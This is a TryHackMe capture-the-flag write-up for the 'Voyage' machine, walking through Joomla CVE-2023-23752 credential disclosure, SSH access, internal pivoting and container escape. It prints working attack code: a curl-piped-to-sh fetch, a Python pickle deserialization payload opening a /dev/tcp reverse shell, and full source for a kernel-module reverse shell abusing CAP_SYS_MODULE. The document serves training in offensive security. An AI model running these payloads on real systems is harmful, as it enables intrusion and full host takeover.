# Voyage_tryhackme_Writeup
Voyage is a CTF challenge focused on chaining multiple vulnerabilities to achieve full system compromise. 


# Enumeration Phase 

# Nmap scan 
$ nmap -p- -sV -sC -A -T4 10.64.166.249

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)


# What do we notice? (Three ports open.) 

22/tcp   open  (ssh)
80/tcp   open  (http)
2222/tcp open  (EtherNetIP-1)

### Directory Enumeration

Directory enumeration was performed using dirsearch:  "dirsearch -u http://10.64.166.249 -e php,txt,html,js"

Initial web enumeration revealed multiple directories and files consistent with a Joomla CMS installation. The presence of /administrator/, along with standard Joomla folders such as /components/, /modules/, and /plugins/, strongly indicated that the target was running Joomla.

Notably discovered paths included:

/administrator/ – Joomla administrator login panel
/configuration.php – Joomla configuration file (contains database credentials if exposed)
/README.txt and /LICENSE.txt – Useful for Joomla version fingerprinting
/robots.txt – Potentially discloses hidden or restricted paths

At this stage, the attack surface shifted toward Joomla-specific enumeration and exploitation rather than generic web attacks.

# Robots.txt 

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/


### Joomla Version Identification

With Joomla identified as the underlying CMS, the next step was to determine the exact version in use. Joomla exposes version information via the following file:

/administrator/manifests/files/joomla.xml

On misconfigured installations, this file is publicly accessible and contains metadata such as the Joomla version and build details. Accessing this endpoint revealed that the target was running:

- **Joomla version:** 4.2.7

Identifying the exact version allowed for targeted vulnerability research. Joomla 4.2.7 is affected by **CVE-2023-23752**, an unauthenticated information disclosure vulnerability, which became the next focus of exploitation.


### Exploitation – CVE-2023-23752 (Improper Access Control)

Based on the identified Joomla version (4.2.7), the application was found to be vulnerable to **CVE-2023-23752**, an unauthenticated improper access control vulnerability that allows sensitive configuration data to be retrieved via the Joomla API.

To exploit this, the Metasploit module "auxiliary/scanner/http/joomla_api_improper_access_checks" was used.


use auxiliary/scanner/http/joomla_api_improper_access_checks
set RHOSTS <target-ip>
run


### Results (Important Findings)

markdown
- Username: root
- Email: mail@tourism.thm

Database Configuration:
- DB Type: mysqli
- DB Host: localhost
- DB Name: joomla_db
- DB User: root
- DB Password: RootPassword@1234
- DB Prefix: ecsjh_


CVE-2023-23752 Mitigation
The best way to mitigate this vulnerability is to update your Joomla! Software to a version that is not affected by this issue. If you are using Joomla Versions 4.0.0 through 4.2.7, updating your software as soon as possible is crucial to protect against this vulnerability.

### SSH Access and Service Enumeration

With valid credentials obtained from the Joomla configuration, the next step was to attempt SSH access. An initial login attempt on the default SSH port failed:

ssh root@10.64.166.249 -p 22

Further service enumeration revealed that multiple SSH services were exposed on the target. One of these was running on a non-standard port.

Connecting to the secondary SSH service on port 2222 succeeded: ssh root@10.64.166.249 -p 2222


### Docker Environment Enumeration

After gaining access to the Docker container, manual enumeration revealed very little useful information. To automate privilege and environment discovery, **linPEAS** was used.

The script was hosted on the attacker machine and retrieved inside the container:


# Attacker machine
python3 -m http.server 8000

# Target (container)
cd /tmp
curl http://<attacker-ip>:8000/linpeas.sh | sh > linpeas.txt

The output was then reviewed for potential escalation paths: cat linpeas.txt | more


While no direct privilege escalation vectors were present within the container itself, linPEAS revealed a critical environmental detail.
SSH_CONNECTION= 10.64.166.249 43906 192.168.100.10 22

Why this matters:
The SSH_CONNECTION environment variable indicated that the container was connected to another system at 192.168.100.10 over SSH. This suggested the presence of an internal network and hinted that the container was being accessed or managed from another host.

### Internal Network Enumeration and Lateral Movement

The discovery of internal SSH connections indicated that the container had access to an internal Docker network. To enumerate hosts and services within this network, `nmap` was transferred into the container and executed against the internal subnet.


wget http:// attackerip:8000/nmap
chmod +x nmap

nmap -Pn 192.168.100.10/24

PORT     STATE SERVICE
22/tcp   open  (ssh)
80/tcp   open  (http)
2222/tcp open  (EtherNetIP-1)
5000/tcp open  (upnp)

Nmap scan report for voyage_priv2.joomla-net (192.168.100.12)
Host is up (0.0000060s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
5000/tcp open  upnp
MAC Address: 02:42:C0:A8:64:0C (Unknown)

Nmap scan report for f5eb774507f2 (192.168.100.10)
Host is up (0.0000040s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

The HTTP service on 192.168.100.12:5000 was not directly accessible from the attacker machine. To access it, SSH local port forwarding was used through the previously compromised SSH service.


Port Forwarding to our attackbox

ssh -L 5000:192.168.100.12:5000 -p 2222 root@10.64.166.249 -N
http://127.0.0.1:5000-) login page 

Accessing the forwarded service revealed a login page. Authentication using default credentials was successful:

- **Username:** admin  
- **Password:** admin

### Internal Web Application Enumeration

With access to the internal web application on http://127.0.0.1:5000, directory enumeration was performed to identify hidden or restricted endpoints.
dirsearch -u http://127.0.0.1:5000 -e php,txt,html,js

The enumeration revealed an interesting endpoint:
/console

Inspecting the page, I discovered that the application was using a **Pickle protocol–based session**.

This was great news, as it meant I could attempt a **Pickle deserialization reverse shell**.

Reference:  
https://medium.com/@thourayabchir1/pythons-pickle-module-and-its-security-risks-c9452eb0c1e2

To generate the payload, I created the following script:

# gen.py
import pickle
import os

class RCE:
    def __reduce__(self):
        return (
            os.system,
            ('bash -c "bash -i >& /dev/tcp/<attackerip>/7001 0>&1"',)
        )

payload = pickle.dumps(RCE())
print(payload.hex())

python3 gen.py


A listener was then started on the attacker machine:
nc -lvnp 7001

curl localhost:5000 -b "session_data=80049550000000000000008c05706f736978948c0673797374656d9493948c3562617368202d63202262617368202d69203e26202f6465762f7463702f31302e36352e3132302e3139382f3730303120303e26312294859452942e" -s
Allwing us to successfully retrieve a shell-- root@d221f7bc7bf8:/finance-app# flag nlocated in root on this machine 

### Vulnerabilities in Docker – Capability Misconfiguration

Once inside the container, capability discovery was performed to determine which privileges were available. Linux capabilities assigned to the container can be identified by inspecting the status of the main container process (PID 1):
root@d221f7bc7bf8:/proc/1#
cat /proc/1/status

CapInh: 0000000000000000
CapPrm: 00000000a80525fb
CapEff: 00000000a80525fb
CapBnd: 00000000a80525fb
CapAmb: 0000000000000000

To interpret these values, the capsh utility was used to decode the capability bitmask:
capsh --decode=00000000a80525fb

This revealed that the container was running with several elevated capabilities, most notably:
CAP_SYS_MODULE

### Why this is Critical

The presence of CAP_SYS_MODULE is particularly dangerous. This capability allows a process to load and unload kernel modules on the host system.

Since containers share the host kernel, possessing CAP_SYS_MODULE effectively breaks container isolation. An attacker can interact directly with the host kernel, leading to full host compromise and bypassing all Linux security mechanisms and container boundaries.



While researching CAP_SYS_MODULE exploitation, many references suggested using the output of `uname -r` to identify a suitable kernel module exploit. This approach is misleading.

Although `uname -r` reveals the running kernel version, **kernel module compatibility depends on the kernel headers and build configuration**, not the driver version or a simple version string alone.

Kernel modules must be compiled specifically against the **exact kernel headers** used by the host. As a result, relying solely on `uname -r` often leads to failed or non-functional exploits.

However, the required kernel header version can be identified from within the system. The kernel headers version is exposed via the following path:

cat /proc/version  or ls -d /usr/src/linux-headers

### Final Exploit – Kernel Module Injection via CAP_SYS_MODULE

printf 'obj-m += revshell.o\n\nall:\n\tmake -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean\n' > Makefile

Kernel module source code was written:

cat > revshell.c << 'EOF'
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/attackerip/5555 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
EOF

make 

if successful, you’ll get:

revshell.ko
revshell.o
Module.symvers
modules.order


### Triggering the Exploit
listner was deployed: nc -lvnp 5555
Execute_shell: insmod revshell.ko

Find root.txt at root directory 

